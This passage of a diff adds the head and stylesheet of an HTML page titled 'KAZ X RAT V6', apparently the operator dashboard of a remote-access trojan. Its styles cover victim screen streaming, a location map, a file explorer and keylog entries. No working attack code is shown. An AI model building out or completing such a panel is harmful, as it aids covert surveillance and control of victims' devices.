@@ -1,0 +1,2043 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>KAZ X RAT V6 — PERMANENT CODE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=MedievalSharp&family=Orbitron&display=swap" rel="stylesheet" />
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        /* ===== RESET & GLOBAL ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            background: #0a0000;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            transition: background 0.6s, color 0.6s;
+        }
+
+        /* ===== THEME NEON ===== */
+        body.theme-neon { background: #0a0015; color: #ff00ff; }
+        body.theme-neon .page { background: rgba(10, 0, 20, 0.80); backdrop-filter: blur(8px); }
+        body.theme-neon .menu-box, body.theme-neon .login-box, body.theme-neon .register-box {
+            background: rgba(20, 0, 40, 0.92) !important;
+            border-color: #ff00ff !important;
+            box-shadow: 0 0 60px #ff00ff44 !important;
+        }
+        body.theme-neon .btn-send, body.theme-neon .btn-login, body.theme-neon .btn-register, body.theme-neon .btn-ok, body.theme-neon .btn-3d {
+            background: linear-gradient(145deg, #ff00ff, #aa00aa) !important;
+            border-color: #ff66ff !important;
+            box-shadow: 0 8px 0 #550055, 0 10px 30px #ff00ff44 !important;
+        }
+        body.theme-neon .menu-box h2, body.theme-neon .login-box h1, body.theme-neon .register-box h1 {
+            color: #ff66ff !important;
+            text-shadow: 0 0 40px #ff00ff88 !important;
+        }
+        body.theme-neon .input-row input, body.theme-neon .input-row select, body.theme-neon .login-box input, body.theme-neon .register-box input {
+            background: #0a0015 !important;
+            border-color: #ff00ff !important;
+            color: #ff66ff !important;
+        }
+        body.theme-neon .input-row label, body.theme-neon .login-box .sub, body.theme-neon .register-box .sub {
+            color: #ff66ff !important;
+        }
+        body.theme-neon #bg-video { opacity: 0.3; filter: hue-rotate(300deg) brightness(0.5); }
+
+        /* ===== THEME CYBERPUNK ===== */
+        body.theme-cyberpunk { background: #000814; color: #00ffff; }
+        body.theme-cyberpunk .page { background: rgba(0, 8, 20, 0.80); backdrop-filter: blur(8px); }
+        body.theme-cyberpunk .menu-box, body.theme-cyberpunk .login-box, body.theme-cyberpunk .register-box {
+            background: rgba(0, 10, 30, 0.92) !important;
+            border-color: #00ffff !important;
+            box-shadow: 0 0 60px #00ffff44 !important;
+        }
+        body.theme-cyberpunk .btn-send, body.theme-cyberpunk .btn-login, body.theme-cyberpunk .btn-register, body.theme-cyberpunk .btn-ok, body.theme-cyberpunk .btn-3d {
+            background: linear-gradient(145deg, #00ffff, #0088aa) !important;
+            border-color: #66ffff !important;
+            box-shadow: 0 8px 0 #004466, 0 10px 30px #00ffff44 !important;
+        }
+        body.theme-cyberpunk .menu-box h2, body.theme-cyberpunk .login-box h1, body.theme-cyberpunk .register-box h1 {
+            color: #66ffff !important;
+            text-shadow: 0 0 40px #00ffff88 !important;
+        }
+        body.theme-cyberpunk .input-row input, body.theme-cyberpunk .input-row select, body.theme-cyberpunk .login-box input, body.theme-cyberpunk .register-box input {
+            background: #000814 !important;
+            border-color: #00ffff !important;
+            color: #66ffff !important;
+        }
+        body.theme-cyberpunk .input-row label, body.theme-cyberpunk .login-box .sub, body.theme-cyberpunk .register-box .sub {
+            color: #66ffff !important;
+        }
+        body.theme-cyberpunk #bg-video { opacity: 0.3; filter: hue-rotate(180deg) brightness(0.5); }
+
+        /* ===== THEME MATRIX ===== */
+        body.theme-matrix { background: #000a00; color: #00ff00; }
+        body.theme-matrix .page { background: rgba(0, 10, 0, 0.80); backdrop-filter: blur(8px); }
+        body.theme-matrix .menu-box, body.theme-matrix .login-box, body.theme-matrix .register-box {
+            background: rgba(0, 20, 0, 0.92) !important;
+            border-color: #00ff00 !important;
+            box-shadow: 0 0 60px #00ff0044 !important;
+        }
+        body.theme-matrix .btn-send, body.theme-matrix .btn-login, body.theme-matrix .btn-register, body.theme-matrix .btn-ok, body.theme-matrix .btn-3d {
+            background: linear-gradient(145deg, #00ff00, #008800) !important;
+            border-color: #66ff66 !important;
+            box-shadow: 0 8px 0 #004400, 0 10px 30px #00ff0044 !important;
+        }
+        body.theme-matrix .menu-box h2, body.theme-matrix .login-box h1, body.theme-matrix .register-box h1 {
+            color: #66ff66 !important;
+            text-shadow: 0 0 40px #00ff0088 !important;
+        }
+        body.theme-matrix .input-row input, body.theme-matrix .input-row select, body.theme-matrix .login-box input, body.theme-matrix .register-box input {
+            background: #000a00 !important;
+            border-color: #00ff00 !important;
+            color: #66ff66 !important;
+        }
+        body.theme-matrix .input-row label, body.theme-matrix .login-box .sub, body.theme-matrix .register-box .sub {
+            color: #66ff66 !important;
+        }
+        body.theme-matrix #bg-video { opacity: 0.2; filter: hue-rotate(120deg) brightness(0.4); }
+
+        /* ===== THEME BLOOD RED ===== */
+        body.theme-bloodred { background: #1a0000; color: #ff4444; }
+        body.theme-bloodred .page { background: rgba(30, 0, 0, 0.80); backdrop-filter: blur(8px); }
+        body.theme-bloodred .menu-box, body.theme-bloodred .login-box, body.theme-bloodred .register-box {
+            background: rgba(40, 0, 0, 0.92) !important;
+            border-color: #ff0000 !important;
+            box-shadow: 0 0 60px #ff000044 !important;
+        }
+        body.theme-bloodred .btn-send, body.theme-bloodred .btn-login, body.theme-bloodred .btn-register, body.theme-bloodred .btn-ok, body.theme-bloodred .btn-3d {
+            background: linear-gradient(145deg, #ff0000, #880000) !important;
+            border-color: #ff4444 !important;
+            box-shadow: 0 8px 0 #440000, 0 10px 30px #ff000044 !important;
+        }
+        body.theme-bloodred .menu-box h2, body.theme-bloodred .login-box h1, body.theme-bloodred .register-box h1 {
+            color: #ff4444 !important;
+            text-shadow: 0 0 40px #ff000088 !important;
+        }
+        body.theme-bloodred .input-row input, body.theme-bloodred .input-row select, body.theme-bloodred .login-box input, body.theme-bloodred .register-box input {
+            background: #1a0000 !important;
+            border-color: #ff0000 !important;
+            color: #ff4444 !important;
+        }
+        body.theme-bloodred .input-row label, body.theme-bloodred .login-box .sub, body.theme-bloodred .register-box .sub {
+            color: #ff4444 !important;
+        }
+        body.theme-bloodred #bg-video { opacity: 0.5; filter: hue-rotate(0deg) saturate(2) brightness(0.5); }
+
+        /* ===== SCANLINE GLITCH ===== */
+        #scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 6px);
+            animation: scanMove 0.1s linear infinite;
+        }
+        @keyframes scanMove { 0% { transform: translateY(0); } 100% { transform: translateY(6px); } }
+
+        /* ===== GLITCH & HOLOGRAM ANIMATION ===== */
+        .glitch-text {
+            animation: glitchText 0.5s infinite alternate;
+        }
+        @keyframes glitchText {
+            0% { text-shadow: 3px 0 red, -3px 0 blue, 0 0 20px rgba(255,0,0,0.5); }
+            25% { text-shadow: -5px 0 cyan, 5px 0 magenta, 0 0 30px rgba(0,255,255,0.5); }
+            50% { text-shadow: 7px 0 lime, -7px 0 purple, 0 0 40px rgba(0,255,0,0.5); }
+            75% { text-shadow: -4px 0 yellow, 4px 0 orange, 0 0 30px rgba(255,255,0,0.5); }
+            100% { text-shadow: 2px 0 white, -2px 0 black, 0 0 20px rgba(255,255,255,0.5); }
+        }
+        .hologram {
+            animation: hologram 2s ease-in-out infinite;
+        }
+        @keyframes hologram {
+            0% { opacity: 0.8; transform: scale(1) rotateY(0deg); }
+            50% { opacity: 1; transform: scale(1.02) rotateY(5deg); }
+            100% { opacity: 0.8; transform: scale(1) rotateY(0deg); }
+        }
+
+        /* ===== SEMUA HALAMAN ===== */
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: fadeIn3D 0.7s ease;
+            transition: background 0.6s, backdrop-filter 0.6s;
+        }
+        .page.active { display: flex; }
+        @keyframes fadeIn3D {
+            0% { opacity: 0; transform: rotateY(10deg) scale(0.9); }
+            100% { opacity: 1; transform: rotateY(0deg) scale(1); }
+        }
+
+        /* ===== TOMBOL 3D ===== */
+        .btn-3d {
+            padding: 16px 36px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Creepster', cursive;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            background: linear-gradient(145deg, #cc0000, #550000);
+            color: #fff;
+            border: 2px solid #ff3333;
+            box-shadow: 0 12px 0 #330000, 0 20px 40px rgba(255,0,0,0.5);
+            transform: rotateX(4deg) rotateY(2deg);
+        }
+        .btn-3d:active { transform: translateY(8px) rotateX(2deg) rotateY(1deg); box-shadow: 0 4px 0 #330000, 0 10px 30px rgba(255,0,0,0.6); }
+
+        /* ===== INTRO FULL LAYAR ===== */
+        #intro-page { padding: 0 !important; background: #000 !important; backdrop-filter: none !important; }
+        #intro-page .video-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            aspect-ratio: unset;
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+            transform: none;
+            background: #000;
+            z-index: 5;
+        }
+        #intro-page .video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            background: #000;
+            cursor: pointer;
+            filter: contrast(1.2) saturate(1.3);
+        }
+        #intro-page .video-wrapper .crt-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.05) 0px, rgba(0,0,0,0.05) 2px, transparent 2px, transparent 6px);
+            mix-blend-mode: overlay;
+            z-index: 5;
+        }
+        #intro-page .skip-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.85);
+            color: #ff4444;
+            padding: 14px 32px;
+            border-radius: 40px;
+            border: 2px solid #ff2222;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 20;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px #ff000088;
+            font-family: 'MedievalSharp', cursive;
+        }
+        #intro-page .skip-btn:active { transform: scale(0.9); }
+        #intro-page .title-overlay {
+            position: fixed;
+            bottom: 40px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 3rem;
+            font-weight: bold;
+            color: #ff3333;
+            text-shadow: 0 0 40px #ff0000, 0 0 80px #880000, 8px 8px 0 #220000;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 6px;
+            background: linear-gradient(transparent, #000000dd);
+            padding: 40px 0 30px;
+            z-index: 6;
+            pointer-events: none;
+        }
+        #intro-page .title-overlay small {
+            display: block;
+            font-size: 1.3rem;
+            color: #ff7777;
+            text-shadow: 0 0 30px #ff2222;
+            font-family: 'MedievalSharp', cursive;
+        }
+
+        /* ===== HAMBURGER (kanan atas) ===== */
+        #hamburger-btn {
+            position: fixed;
+            top: 16px;
+            right: 16px;
+            z-index: 100;
+            background: rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 40px;
+            padding: 10px 16px;
+            cursor: pointer;
+            backdrop-filter: blur(8px);
+            transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        #hamburger-btn:hover { background: rgba(0,0,0,0.8); border-color: #ff3333; }
+        #hamburger-btn .bar { width: 28px; height: 3px; background: #fff; border-radius: 4px; transition: 0.3s; }
+
+        /* ===== DROPDOWN MENU ===== */
+        #dropdown-menu {
+            position: fixed;
+            top: 70px;
+            right: 16px;
+            z-index: 99;
+            background: rgba(10,0,0,0.92);
+            backdrop-filter: blur(14px);
+            border: 1px solid #882222;
+            border-radius: 20px;
+            padding: 8px 0;
+            min-width: 180px;
+            display: none;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 40px rgba(255,0,0,0.1);
+            animation: dropIn 0.25s ease;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        #dropdown-menu.open { display: block; }
+        @keyframes dropIn { 0% { opacity: 0; transform: translateY(-10px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
+        #dropdown-menu .menu-item {
+            padding: 10px 20px;
+            color: #fff;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        #dropdown-menu .menu-item:last-child { border-bottom: none; }
+        #dropdown-menu .menu-item:hover { background: rgba(255,0,0,0.15); color: #ff6666; }
+        #dropdown-menu .menu-item .theme-dot {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 1px solid rgba(255,255,255,0.2);
+            display: inline-block;
+            flex-shrink: 0;
+        }
+
+        /* ===== NOTIFIKASI ===== */
+        #notification {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(0, 20, 0, 0.95);
+            backdrop-filter: blur(14px);
+            border: 2px solid #44ff88;
+            border-radius: 20px;
+            padding: 16px 32px;
+            z-index: 200;
+            font-family: 'MedievalSharp', cursive;
+            font-size: 1.2rem;
+            color: #88ffbb;
+            box-shadow: 0 0 60px #00ff6644;
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            opacity: 0;
+            pointer-events: none;
+            text-align: center;
+        }
+        #notification.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+        #notification .notif-icon { font-size: 1.6rem; margin-right: 10px; }
+
+        /* ===== LOGIN ===== */
+        #login-page .login-box {
+            background: rgba(16, 0, 0, 0.92);
+            padding: 30px 24px;
+            border-radius: 60px 20px 60px 20px;
+            border: 3px solid #aa2222;
+            box-shadow: 0 0 100px #ff000055, inset 0 0 60px #440000, 0 30px 50px rgba(0,0,0,0.8);
+            width: 95%;
+            max-width: 440px;
+            text-align: center;
+            backdrop-filter: blur(14px);
+            transform: rotateY(4deg) rotateX(2deg) translateZ(30px);
+            transition: 0.3s;
+        }
+        #login-page .login-box:hover { transform: rotateY(2deg) rotateX(1deg) translateZ(50px); box-shadow: 0 0 140px #ff000066; }
+        #login-page .login-box h1 {
+            font-family: 'Creepster', cursive;
+            font-size: 3.6rem;
+            color: #ff3333;
+            text-shadow: 0 0 50px #ff0000, 0 0 100px #aa0000, 8px 8px 0 #330000;
+            letter-spacing: 8px;
+            margin-bottom: 6px;
+            transform: translateZ(20px);
+        }
+        #login-page .login-box .sub { color: #ff7777; font-size: 0.9rem; margin-bottom: 16px; border-bottom: 1px solid #882222; padding-bottom: 10px; letter-spacing: 2px; }
+        #login-page .input-group { width: 100%; margin: 8px 0; text-align: left; }
+        #login-page .input-group label { font-size: 0.9rem; color: #ff9999; display: block; margin-bottom: 4px; letter-spacing: 2px; }
+        #login-page .input-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 50px;
+            border: 2px solid #882222;
+            background: #1a0a0a;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            box-shadow: inset 0 4px 10px rgba(0,0,0,0.6);
+        }
+        #login-page .input-group input:focus { border-color: #ff3333; box-shadow: 0 0 40px #ff000066, inset 0 4px 10px #000; }
+        #login-page .btn-login {
+            width: 100%;
+            padding: 18px;
+            margin: 18px 0 10px;
+            font-size: 1.8rem;
+            border-radius: 60px;
+            background: linear-gradient(145deg, #cc1111, #770000);
+            border: 3px solid #ff4444;
+            box-shadow: 0 12px 0 #330000, 0 20px 50px #ff000066;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 6px;
+            transform: rotateX(3deg);
+        }
+        #login-page .btn-login:active { transform: translateY(8px) rotateX(1deg); box-shadow: 0 4px 0 #330000, 0 10px 40px #ff000066; }
+        #login-page .register-link { color: #ff8888; text-decoration: underline; cursor: pointer; font-size: 0.9rem; text-shadow: 0 0 20px #ff000066; }
+        #login-page .dev-note { margin-top: 18px; font-size: 0.8rem; color: #665555; border-top: 1px solid #331111; padding-top: 12px; }
+        #login-page .dev-note span { color: #aa4444; font-weight: bold; text-shadow: 0 0 20px #ff000066; }
+
+        /* ===== REGISTER ===== */
+        #register-page .register-box {
+            background: rgba(16, 0, 0, 0.92);
+            padding: 30px 24px;
+            border-radius: 60px 20px 60px 20px;
+            border: 3px solid #22aa44;
+            box-shadow: 0 0 100px #00ff4466, inset 0 0 60px #004422, 0 30px 50px rgba(0,0,0,0.8);
+            width: 95%;
+            max-width: 440px;
+            text-align: center;
+            backdrop-filter: blur(14px);
+            transform: rotateY(4deg) rotateX(2deg) translateZ(30px);
+            transition: 0.3s;
+        }
+        #register-page .register-box:hover { transform: rotateY(2deg) rotateX(1deg) translateZ(50px); box-shadow: 0 0 140px #00ff4466; }
+        #register-page .register-box h1 { font-family: 'Creepster', cursive; font-size: 2.8rem; color: #44ff88; text-shadow: 0 0 50px #00ff66, 8px 8px 0 #004422; letter-spacing: 4px; margin-bottom: 6px; }
+        #register-page .register-box .sub { color: #88ffbb; font-size: 0.9rem; margin-bottom: 16px; border-bottom: 1px solid #228844; padding-bottom: 10px; }
+        #register-page .register-box .input-group { width: 100%; margin: 8px 0; text-align: left; }
+        #register-page .register-box .input-group label { font-size: 0.9rem; color: #88ffbb; display: block; margin-bottom: 4px; letter-spacing: 2px; }
+        #register-page .register-box .input-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 50px;
+            border: 2px solid #228844;
+            background: #0a1a0a;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            box-shadow: inset 0 4px 10px rgba(0,0,0,0.6);
+        }
+        #register-page .register-box .input-group input:focus { border-color: #44ff88; box-shadow: 0 0 40px #00ff6666, inset 0 4px 10px #000; }
+        #register-page .register-box .btn-register {
+            width: 100%;
+            padding: 18px;
+            margin: 18px 0 10px;
+            font-size: 1.6rem;
+            border-radius: 60px;
+            background: linear-gradient(145deg, #22aa44, #116622);
+            border: 3px solid #44ff88;
+            box-shadow: 0 12px 0 #004422, 0 20px 50px #00ff4466;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 4px;
+            transform: rotateX(3deg);
+        }
+        #register-page .register-box .btn-register:active { transform: translateY(8px) rotateX(1deg); box-shadow: 0 4px 0 #004422, 0 10px 40px #00ff4466; }
+        #register-page .register-box .back-link { color: #88ffbb; text-decoration: underline; cursor: pointer; font-size: 0.9rem; text-shadow: 0 0 20px #00ff6666; }
+
+        /* ===== MENU RAT V6 ===== */
+        #menu-page .menu-box {
+            background: rgba(10, 0, 0, 0.92);
+            border-radius: 30px 20px 30px 20px;
+            border: 3px solid #992222;
+            box-shadow: 0 0 100px #ff000033, inset 0 0 50px #331111, 0 30px 50px rgba(0,0,0,0.8);
+            padding: 20px 16px 24px;
+            width: 95%;
+            max-width: 950px;
+            backdrop-filter: blur(14px);
+            transform: rotateY(2deg) rotateX(1deg) translateZ(10px);
+            transition: 0.3s;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        #menu-page .menu-box:hover { transform: rotateY(1deg) rotateX(1deg) translateZ(20px); box-shadow: 0 0 140px #ff000044; }
+        #menu-page .menu-box h2 {
+            font-family: 'Creepster', cursive;
+            font-size: 2.2rem;
+            color: #ff3333;
+            text-shadow: 0 0 40px #ff0000, 6px 6px 0 #330000;
+            text-align: center;
+            margin-bottom: 4px;
+            transform: translateZ(20px);
+        }
+        #menu-page .menu-box .sub-title {
+            text-align: center;
+            color: #888;
+            font-size: 0.8rem;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #331111;
+            padding-bottom: 8px;
+        }
+
+        /* ===== PERMANENT CODE DISPLAY — JELAS & BESAR ===== */
+        .permanent-code {
+            background: rgba(0, 20, 40, 0.9);
+            border: 2px solid #44ff88;
+            border-radius: 16px;
+            padding: 16px 20px;
+            text-align: center;
+            margin-bottom: 12px;
+            box-shadow: 0 0 40px rgba(68, 255, 136, 0.2);
+        }
+        .permanent-code .label {
+            font-size: 0.7rem;
+            color: #88ffbb;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        .permanent-code .code {
+            font-size: 3.2rem;
+            font-weight: 900;
+            letter-spacing: 12px;
+            color: #44ff88;
+            text-shadow: 0 0 40px #44ff8866, 0 0 80px #44ff8844;
+            font-family: 'Courier New', monospace;
+            padding: 4px 0;
+        }
+        .permanent-code .code-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 6px;
+        }
+        .permanent-code .code-actions .btn {
+            width: auto;
+            padding: 4px 18px;
+            font-size: 0.7rem;
+            box-shadow: 0 3px 0 #004422;
+        }
+        .permanent-code .hint {
+            font-size: 0.7rem;
+            color: #88aacc;
+            margin-top: 6px;
+            letter-spacing: 1px;
+        }
+
+        /* ===== TAB MENU ===== */
+        .tab-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 16px;
+            padding: 4px;
+            border: 1px solid rgba(255,255,255,0.05);
+            flex-wrap: wrap;
+        }
+        .tab-container .tab-btn {
+            flex: 1;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 12px;
+            background: transparent;
+            color: #888;
+            font-weight: 700;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            min-width: 70px;
+        }
+        .tab-container .tab-btn.active {
+            background: #ff0040;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(255,0,64,0.3);
+        }
+        .tab-container .tab-btn:hover:not(.active) { color: #fff; }
+
+        /* ===== PANEL ===== */
+        .panel {
+            display: none;
+            flex-direction: column;
+            gap: 14px;
+            animation: fadeIn 0.3s ease;
+        }
+        .panel.active { display: flex; }
+        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px); } 100% { opacity: 1; transform: translateY(0); } }
+
+        /* ===== CARD ===== */
+        .card {
+            background: rgba(255,255,255,0.04);
+            border-radius: 16px;
+            padding: 14px 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: 0.3s;
+        }
+        .card:hover { border-color: rgba(255,255,255,0.1); }
+        .card .card-title {
+            font-size: 0.75rem;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .card .card-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4px 0;
+            font-size: 0.9rem;
+        }
+        .card .card-row .label { color: #aaa; }
+        .card .card-row .value { color: #fff; font-weight: bold; }
+
+        /* ===== RAT CONTROL GRID ===== */
+        .ctrl-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+            gap: 8px;
+        }
+        .ctrl-grid .ctrl-btn {
+            padding: 10px 6px;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.04);
+            color: #fff;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.05);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+        }
+        .ctrl-grid .ctrl-btn:hover {
+            background: rgba(255,0,64,0.15);
+            border-color: #ff0040;
+            transform: translateY(-2px);
+        }
+        .ctrl-grid .ctrl-btn .icon { font-size: 1.3rem; }
+        .ctrl-grid .ctrl-btn .label { font-size: 0.6rem; color: #aaa; }
+
+        /* ===== STREAM ===== */
+        .stream-wrapper {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            width: 100%;
+            aspect-ratio: 16/9;
+            max-height: 40vh;
+            border: 2px solid #222;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .stream-wrapper video { width: 100%; height: 100%; object-fit: contain; background: #000; }
+        .stream-wrapper .placeholder { color: #444; font-size: 0.9rem; text-align: center; padding: 20px; }
+
+        /* ===== MAP ===== */
+        #map {
+            height: 200px;
+            width: 100%;
+            border-radius: 12px;
+            border: 1px solid #333;
+        }
+
+        /* ===== FILE EXPLORER ===== */
+        .file-list {
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 0.8rem;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            padding: 8px;
+        }
+        .file-list .file-item {
+            padding: 4px 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            display: flex;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+        .file-list .file-item:hover { background: rgba(255,255,255,0.05); }
+        .file-list .file-item .name { color: #aaa; }
+        .file-list .file-item .size { color: #555; font-size: 0.7rem; }
+
+        /* ===== STATS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+            gap: 8px;
+        }
+        .stats-grid .stat-item {
+            background: rgba(255,255,255,0.04);
+            border-radius: 12px;
+            padding: 10px 8px;
+            text-align: center;
+        }
+        .stats-grid .stat-item .number { font-size: 1.4rem; font-weight: 900; color: #ff0040; }
+        .stats-grid .stat-item .label { font-size: 0.6rem; color: #888; }
+        .chart-container {
+            height: 120px;
+            width: 100%;
+        }
+
+        /* ===== ZOOM SLIDER ===== */
+        .zoom-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 4px 0;
+        }
+        .zoom-control input[type="range"] {
+            width: 100%;
+            accent-color: #ff0040;
+            background: #333;
+            border-radius: 10px;
+            height: 4px;
+            -webkit-appearance: none;
+        }
+        .zoom-control input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #ff0040;
+            cursor: pointer;
+        }
+        .zoom-control .zoom-label {
+            font-size: 0.75rem;
+            color: #aaa;
+            min-width: 40px;
+            text-align: center;
+        }
+
+        /* ===== LOG ===== */
+        .log-box {
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            padding: 10px 14px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-size: 0.7rem;
+            color: #888;
+            border: 1px solid rgba(255,255,255,0.04);
+            margin-top: 4px;
+        }
+        .log-box .log-entry { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .log-box .log-entry .time { color: #555; margin-right: 8px; }
+        .log-box .log-entry .text { color: #aaa; }
+        .log-box .log-entry .text.success { color: #44ff88; }
+        .log-box .log-entry .text.error { color: #ff4444; }
+        .log-box .log-entry .text.keylog { color: #ffaa44; }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 60px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            background: linear-gradient(135deg, #ff0040, #cc0033);
+            color: #fff;
+            box-shadow: 0 6px 0 #66001a;
+            width: 100%;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        .btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #66001a; }
+        .btn-secondary { background: linear-gradient(135deg, #222, #333); box-shadow: 0 6px 0 #111; }
+        .btn-success { background: linear-gradient(135deg, #00cc66, #009955); box-shadow: 0 6px 0 #004422; }
+        .btn-sm { padding: 6px 12px; font-size: 0.7rem; box-shadow: 0 3px 0 #66001a; }
+        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn-group .btn { flex: 1; min-width: 70px; }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255,255,255,0.04);
+            padding: 8px 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.8rem;
+        }
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        .status-dot.online { background: #44ff88; box-shadow: 0 0 20px #44ff8866; }
+        .status-dot.offline { background: #ff4444; box-shadow: 0 0 20px #ff444466; }
+        .status-dot.waiting { background: #ffaa44; box-shadow: 0 0 20px #ffaa4466; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            #menu-page .menu-box { padding: 12px 10px; }
+            #menu-page .menu-box h2 { font-size: 1.4rem; }
+            .ctrl-grid { grid-template-columns: repeat(auto-fill, minmax(70px, 1fr)); }
+            .ctrl-grid .ctrl-btn { padding: 8px 4px; font-size: 0.65rem; }
+            .ctrl-grid .ctrl-btn .icon { font-size: 1rem; }
+            .permanent-code .code { font-size: 2.2rem; letter-spacing: 6px; }
+            .permanent-code { padding: 12px 14px; }
+            .stream-wrapper { max-height: 30vh; }
+            .tab-container .tab-btn { font-size: 0.6rem; padding: 6px 4px; min-width: 50px; }
+            .btn { font-size: 0.75rem; padding: 8px 14px; }
+            .stats-grid { grid-template-columns: repeat(auto-fill, minmax(60px, 1fr)); }
+            .stats-grid .stat-item .number { font-size: 1rem; }
+            .card { padding: 10px 12px; }
